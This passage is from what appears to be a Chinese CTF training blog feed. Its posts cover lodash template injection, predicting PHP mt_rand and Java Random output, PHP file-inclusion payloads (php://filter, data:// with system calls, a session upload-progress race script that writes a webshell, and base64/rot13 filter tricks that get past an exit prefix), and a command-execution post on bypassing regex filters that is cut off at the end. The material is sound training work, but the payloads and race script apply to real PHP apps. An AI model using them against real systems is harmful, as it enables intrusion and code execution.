class="hljs-built_in">JSON</span>.stringify(&#123;<span class="hljs-attr">winner</span>: -<span class="hljs-number">1</span>&#125;))<br>    &#125;<br>&#125;)<br>app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;app listening on port 3000!&#x27;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>首先判断请求方式是POST，然后进行下一步，通过lodash.merge，将我们body中的数值给data,然后session中储存这个data，这里也大概跟了一下lodash.merge，其原理应该就是正常的merge。</p><p>赋值完了之后进行渲染index,在渲染的适合，会跳到下面这个函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.engine(<span class="hljs-string">&#x27;ejs&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">filePath, options, callback</span>) </span>&#123; <span class="hljs-comment">// define the template engine</span><br>    fs.readFile(filePath, <span class="hljs-function">(<span class="hljs-params">err, content</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> callback(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(err))<br>  <span class="hljs-keyword">let</span> compiled = lodash.template(content)<br>    <span class="hljs-keyword">let</span> rendered = compiled(&#123;...options&#125;)<br>    <span class="hljs-keyword">return</span> callback(<span class="hljs-literal">null</span>, rendered)<br>&#125;)<br>&#125;)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>伪随机数</title>
    <link href="/2021/11/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%88%86%E6%9E%90/"/>
    <url>/2021/11/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><blockquote><p>mt_scrand()//播种Mersenne Twister随机数生成器</p><p>mt_rand()//生成随机数</p></blockquote><p>mt_scrand()通过seed分发种子，通过mt_rand()生成伪随机数</p><p>从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211114013004978.png"></p><p>当种子不变时，生成的随机数是不变的，这就是伪随机数的漏洞所在</p><p>ctfshow25</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br>    mt_srand(hexdec(substr(md5(<span class="hljs-variable">$flag</span>), <span class="hljs-number">0</span>,<span class="hljs-number">8</span>)));<br>    <span class="hljs-variable">$rand</span> = intval(<span class="hljs-variable">$r</span>)-intval(mt_rand());<br>    <span class="hljs-keyword">if</span>((!<span class="hljs-variable">$rand</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$rand</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">echo</span> system(<span class="hljs-string">&#x27;cat /proc/version&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>首先我们要获得第一个随机数，根据条件，传入r=0；使用工具对得到的第一个随机数进行逆推，<a href="https://github.com/openwall/php_mt_seed">https://github.com/openwall/php_mt_seed</a></p><p>得到<strong>两个可能</strong>的随机数种子，即值<code>hexdec(substr(md5($flag), 0,8))</code></p><p>当<code>$_COOKIE[&#39;token&#39;]==(mt_rand()+mt_rand())</code>时得到flag，由于前面已经执行了一次<code>mt_rand()</code>，我们需要得到后面两次的<code>mt_rand()</code>相加</p><p>编写脚本，对两个种子进行尝试，即得到两个<code>mt\_rand()+mt\_rand()</code>进行尝试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mt_scand(得到的种子值);<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand()+mt_rand();<br></code></pre></td></tr></table></figure><p>r=从页面得到的第一个随机数值 Cooke:token=脚本得到的两个随机数值相加</p><p>纵观整体难度不大，主要理解漏洞原理，以及题目使用的是后面两个随机值的相加</p><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><p>强伪随机数RNG实现<code>java.security.SecureRandom</code>类，该类使用临时文件夹中大小，线程休眠时间等的值作为随机数种子；而弱伪随机数实现PRNG<code>java.util.Random</code>类，默认使用当前时间作为种子，并且采用线性同余法计算下一个随机数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> learn;<br><span class="hljs-keyword">import</span> java.util.Random;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">World</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Random r1 = <span class="hljs-keyword">new</span> Random(<span class="hljs-number">1</span>);<br>        System.out.println(<span class="hljs-string">&quot;r1.nextINT(12)=&quot;</span> + r1.nextInt(<span class="hljs-number">12</span>));<br><br>        Random r2 = <span class="hljs-keyword">new</span> Random(<span class="hljs-number">1</span>);<br>        System.out.println(<span class="hljs-string">&quot;r2.nextINT(12)=&quot;</span> + r2.nextInt(<span class="hljs-number">12</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>得到</p><blockquote><p>r1.nextINT(12)=5<br>r2.nextINT(12)=5</p></blockquote><p>无论执行多少次，结果都不会改变，Random生成的随机数是伪随机数，这就可以预测<code>java.util.Random</code>。调用<code>random.nextInt</code>生成三个连续的随机数，根据前两个随机数就可以预测第三个随机数。这里我们跟一下源代码<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211114164615749.png"></p><p>调用next方法，如果bound是非正，抛出异常</p><p>传参31，<code>bound&amp;m)==0</code>判断bound是否为2的x次方，如果是，则r值取<code>(int)((bound * (long)r) &gt;&gt; 31)</code>，next(31)传了什么值？跟进next<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211114165211667.png"></p><p>Random.class有三个常量</p><blockquote><p>  private static final long multiplier = 0x5DEECE66DL;//进制是25214903917</p><p>  private static final long addend = 0xBL;//十进制是11</p><p>  private static final long mask = (1L &lt;&lt; 48) - 1;//十进制是281474976710655，十六进制是0xffffffffffff</p></blockquote><p>构造方法</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211114202701125.png"></p><blockquote><p>oldseed是(0x2F^0x5DEECE66D)&amp;0xffffffffffff的值0x5DEECE642， nextseed为（oldseed*0x5DEECE66D+0xB）&amp; 0xffffffffffff的值0xBA2442955625，seed.compareAndSet(oldseed, nextseed)判断nextseed是否为预期的结果， 如果是预期结果返回0xBA2442955625 &gt;&gt;&gt; (48 - 31)为0x5D12214A；因此next(31)为0x5D12214A(十进制为1561469258)</p></blockquote><p>就是说随机数种子oldseed和后一个随机数种子nextseed都被定义为long类型，返回为下一个种子右移48-31=17位后强制转换int的结果</p><p>while里的compareAndSet方法比较当前种子是否为oldseed，如果是的话就</p><p>更新为nextseed，一般都会返回true，下一个种子的更新算法在do…while结构里面，<code>nextseed=(oldseed * multiplier + addend) &amp; mask</code></p><p>//java.util.Random <a href="https://bbs.csdn.net/topics/390855511">https://bbs.csdn.net/topics/390855511</a></p><p>//AtomicLong<a href="https://blog.csdn.net/weixin_42146366/article/details/87820373">https://blog.csdn.net/weixin_42146366/article/details/87820373</a></p><ul><li>预测方法</li></ul><blockquote><p>如果把生成第一个随机数的种子定义为seed1，seed2，seed3往后顺延的话，seed1右移16位就是第一个随机数的值，说明第一个随机数丢了16位，导致seed1就有2的16次方种可能。</p><p>把2的16次方种可能带入计算下一个seed2，并且右移查看是否和第二个随机数的值相等就能确定是否正确的找到了seed1。</p><p>如果前两个数是正数，但第三个数是负数，只需要对得到的补码再求一次补码即可，也就是取反后加1。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2021/09/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2021/09/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><blockquote><p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p><p>?file=data://text/plain,&lt;?php system(‘tac flag.php’);?&gt;</p><p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</p></blockquote><ul><li>日志包含</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210819110931740.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210819111129373.png"></p><ul><li>session文件竞争包含</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>点被过滤了，就不能包含日志文件了</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210822104732779.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210822104757678.png"></p><p>此时用户是可以自己定义Session  ID的。比如，我们在<code>Cookie</code>里设置<code>PHPSESSID=flag</code>，PHP将会在服务器上创建一个文件：<code>/tmp/sess_flag</code>。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值。在Linux系统中，session文件一般的默认存储位置为 <code>/tmp </code>或<code> /var/lib/php/session</code></p><p>但是<strong>session.upload_progress.cleanup默认是开启的，一旦读取了所有POST数据，它就会清除进度信息</strong></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210822124557917.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;地址&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;change here&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>抓包，添加<code>Cookie: PHPSESSID=flag</code>，在<code>PHP_SESSION_UPLOAD_PROGRESS</code>下添加一句话木马。</p><p>PHP将会在服务器上创建一个文件：<code>/tmp/sess_flag</code></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/1999159-20201011101000761-1649541695.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/1999159-20201010204012871-1202434485.png"></p><p>两者都重复发包即可，在得到<code>ls</code>的结果后，修改包再重复发包即可。</p><p>上面所谓的payload可加可不加，不加将攻击类型设置为Null Payload即可。</p><blockquote><p>当没有直接文件包含的点时，（比如文件上传漏洞，利用了sess上传进度，.user.ini/ini包含的文件/ini包含的文件包含sess_flag）</p><p>python通用脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>sessID = <span class="hljs-string">&#x27;flag&#x27;</span><br>url = <span class="hljs-string">&#x27;http://761f62d0-9936-4b3c-be74-0b640259cea8.challenge.ctf.show:8080/&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">session</span>):</span><br>    <span class="hljs-keyword">while</span> event.isSet():<br>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">256</span> * <span class="hljs-number">1</span>)<span class="hljs-comment">#创建文件</span><br>        response = session.post(<span class="hljs-comment">#post上传</span><br>            url,<br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,<span class="hljs-comment">#设置cookie为sessid</span><br>            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php system(&quot;nl ../*.php&quot;);?&gt;&#x27;</span>&#125;,<br>            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;flag.txt&#x27;</span>, f)&#125;<span class="hljs-comment">#设置post具体内容，这里可以files=file</span><br>        )<br><br><span class="hljs-comment">#def read(session):</span><br><span class="hljs-comment">#    while event.isSet():</span><br><span class="hljs-comment">#        data =&#123;</span><br><span class="hljs-comment">#            &#x27;ctf&#x27;:&quot;/tmp/sess_&quot;+sessid   #包含我们的session路径</span><br><span class="hljs-comment">#        &#125;</span><br>                         <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">session</span>):</span><br>    <span class="hljs-keyword">while</span> event.isSet():<br>        response = session.get(url + <span class="hljs-string">&#x27;upload/index.php&#x27;</span>.<span class="hljs-built_in">format</span>(sessID)) <span class="hljs-comment">#获得相应包</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(response.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]retrying...&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<span class="hljs-comment">#条件竞争</span><br>    event = threading.Event()<br>    event.<span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            threading.Thread(target=write, args=(session,)).start()<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br><br></code></pre></td></tr></table></figure><p>当然也可以使用bp完成</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211005183417107.png"></p></blockquote><ul><li>死亡exit</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    file_put_contents(urldecode(<span class="hljs-variable">$file</span>), <span class="hljs-string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="hljs-variable">$content</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>base64：</p><p>GET</p><p>url全编码：php://filter/write=convert.base64-decode/resource=1.php</p><p>POST</p><p>base64：&lt;?php system(‘tac f*’);?&gt;</p><p>==&gt; PD9waHAgc3lzdGVtKCd0YWMgZionKTs/Pg==</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p><p>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>] = preg_replace(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);<br>base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>所以，当<code>$content</code>被加上了<code>&lt;?php exit;?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode  来首先对其解码。在解码的过程中，字符<code>&lt;</code> <code>?</code> <code>;</code> <code>&gt;</code> <code>空格</code>等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p><p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p></blockquote><p>==&gt; aaPD9waHAgc3lzdGVtKCd0YWMgZionKTs/Pg==</p><p>此处为&lt;?php die(‘大佬别秀了’);?&gt; ==&gt; phpdie故前面添加两个字符</p></blockquote><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210903001809220.png"></p><blockquote><p>rot13</p><p>GET</p><p>全编码：php://filter/write=string.rot13/resource=2.php</p><p>POST</p><p>&lt;?cuc flfgrz(‘gnp s*’);?&gt;</p></blockquote><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210903002413152.png"></p><blockquote><p>.htaccess的预包含利用</p><p>同样使用过滤器，string.strip_tags</p><p>GET</p><p>全编码：php://filter/write=string.strip_tags|convert.base64-decode/resource=1.php</p><p>POST</p><p>base64：&lt;?php system(‘tac f*’);</p><p>==&gt; PD9waHAgc3lzdGVtKCd0YWMgZionKTs=</p></blockquote><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210904232700304.png"></p><p>string.strip_tags可以在php5的环境下顺利的使用，如果题目环境是在php7.3.0以上的环境下，就会出现上面的情况，但此题是可以写进去的，访问1.php即可</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行</title>
    <link href="/2021/08/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2021/08/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="eval-c"><a href="#eval-c" class="headerlink" title="eval(c)"></a>eval(c)</h2><ul><li>从绕过正则匹配的角度：</li></ul><p>过滤了关键单词 如flag、php 在linux可以使用占位符<code>？</code>和<code>*</code></p><p>比如<code>flag.php</code>可以使用<code>fl??.???</code>或者<code>fl?g.??p</code>和<code>f*</code>或者 <code>f***</code>等</p><p>也可以使用空字符<code>&#39;&#39;</code>夹在过滤内容之中<code>fl&#39;&#39;ag.php</code>  </p><p>还可以这样<code>fla\g.php</code>或者正则<code>f[abcd]ag.php</code>、<code>f[a-z]ag.php</code> <code>[abcd]</code> (<code>[abcd]</code> 匹配<code>abcd</code>中一个字符<code>[a-z]</code> 匹配范围 <code>a-z</code>)</p><p>payload优先级<code>* = &#39;&#39; = \ &gt; ?</code></p><ul><li>从变量逃逸的角度</li></ul><p>对一个变量的正则过滤比较多的时候 可以对变量进行逃逸 比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;   <br> <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];   <br> <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;     <br>     <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);   <br> &#125;   <br>&#125;<span class="hljs-keyword">else</span>&#123;   <br> highlight_file(<span class="hljs-keyword">__FILE__</span>); 